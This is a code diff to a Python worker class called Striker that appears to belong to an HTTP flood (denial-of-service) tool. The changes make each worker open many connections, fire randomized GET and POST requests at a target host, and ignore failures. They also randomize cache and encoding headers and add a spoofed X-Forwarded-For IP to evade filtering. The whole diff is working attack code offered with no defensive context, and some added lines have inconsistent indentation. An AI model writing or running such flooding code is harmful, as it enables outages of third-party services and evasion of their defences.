@@ -277,8 +277,14 @@ class Striker(Process):
             ]
 
 
+      
+    def generateFakeIP(self):
+        return '.'.join(str(random.randint(1, 254)) for _ in range(4))
+
+
     def __del__(self):
         self.stop()
+
 
 
     #builds random ascii string
@@ -299,50 +305,57 @@ class Striker(Process):
 
 
     def run(self):
+       if DEBUG:
+        print("Starting worker {0}".format(self.name))
 
-        if DEBUG:
-            print("Starting worker {0}".format(self.name))
+       while self.runnable:
+        try:
+            self.socks = []  # reset each loop
 
-        while self.runnable:
-
-            try:
-
-                for i in range(self.nr_socks):
-
-                    if self.ssl:
-                        if SSLVERIFY:
-                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
-                        else:
-                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
+            for i in range(self.nr_socks):
+                if self.ssl:
+                    if SSLVERIFY:
+                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                     else:
-                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)
+                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
+                else:
+                    c = HTTPCLIENT.HTTPConnection(self.host, self.port)
+                self.socks.append(c)
 
-                    self.socks.append(c)
+            for conn_req in self.socks:
+                (url, headers) = self.createPayload()
+                method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
 
-                for conn_req in self.socks:
+                if method == METHOD_POST:
+                    payload = self.generateQueryString(random.randint(5, 10))
+                    try:
+                        conn_req.request(method.upper(), url, body=payload, headers=headers)
+                    except:
+                        self.incFailed()
+                else:
+                    try:
+                        conn_req.request(method.upper(), url, headers=headers)
+                    except:
+                        self.incFailed()
 
-                    (url, headers) = self.createPayload()
-
-                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
-
-                    conn_req.request(method.upper(), url, None, headers)
-
-                for conn_resp in self.socks:
-
+            for conn_resp in self.socks:
+                try:
                     resp = conn_resp.getresponse()
                     self.incCounter()
+                except:
+                    self.incFailed()
 
-                self.closeConnections()
+            self.closeConnections()
 
-            except:
-                self.incFailed()
-                if DEBUG:
-                    raise
-                else:
-                    pass # silently ignore
+        except:
+            self.incFailed()
+            if DEBUG:
+                raise
+            else:
+                pass
 
         if DEBUG:
-            print("Worker {0} completed run. Sleeping...".format(self.name))
+              print("Worker {0} completed run. Sleeping...".format(self.name))
 
     def closeConnections(self):
         for conn in self.socks:
@@ -467,11 +480,17 @@ class Striker(Process):
 
         http_headers = {
             'User-Agent': self.getUserAgent(),
-            'Cache-Control': noCache,
-            'Accept-Encoding': ', '.join(roundEncodings),
-            'Connection': 'keep-alive',
-            'Keep-Alive': random.randint(1,1000),
-            'Host': self.host,
+        'Cache-Control': random.choice(['no-cache', 'no-store', 'must-revalidate']),
+        'Accept-Encoding': ', '.join(random.sample(['gzip', 'deflate', 'br', '*', 'identity'], k=random.randint(2, 4))),
+        'Connection': random.choice(['keep-alive', 'close']),
+        'Keep-Alive': str(random.randint(100, 10000)),
+        'Host': self.host,
+        'X-Requested-With': 'XMLHttpRequest',
+        'X-Forwarded-For': self.generateFakeIP(),
+        'DNT': str(random.randint(0,1)),
+        'Pragma': 'no-cache',
+        'TE': random.choice(['trailers', '']),
+        'Upgrade-Insecure-Requests': '1'
         }
 
         # Randomly-added headers
